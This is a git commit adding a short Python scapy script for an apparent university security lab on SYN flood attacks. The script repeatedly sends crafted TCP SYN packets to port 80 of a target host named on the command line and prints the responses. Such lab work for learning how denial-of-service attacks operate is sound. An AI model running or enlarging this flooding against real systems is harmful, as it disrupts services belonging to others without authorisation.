0316d34f5252666b3601707690a98f6a4d879669
Aditya J Karia <adityakaria01@gmail.com>
2020-03-13 14:59:56 +0530

    ias lab6 SYN ACK flood attack

---
+++ ias/lab6-syn-flood-attack/171IT203_IT352_P6.py
@@ -0,0 +1,15 @@
+import sys
+from scapy.all import *
+print "Field Values of packet sent"
+p = IP(dst=sys.argv[1], id=1111, ttl=99)/TCP(sport=4444,
+                                             dport=80, seq=12345, ack=1000, window=1000, flags="S")/"HaX0r SVP"
+ls(p)
+print "Sending Packets in 0.03 second intervals for timeout of 4 sec"
+ans, unans = srloop(p, inter=0.03, retry=2, timeout=4)
+print "Summary of answered & unanswered packets"
+ans.summary()
+unans.summary()
+print "source port flags in response"
+for s, r in ans:
+    print r.sprintf("%TCP.sport% \t %TCP.flags%")
+ans.make_table(lambda(s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
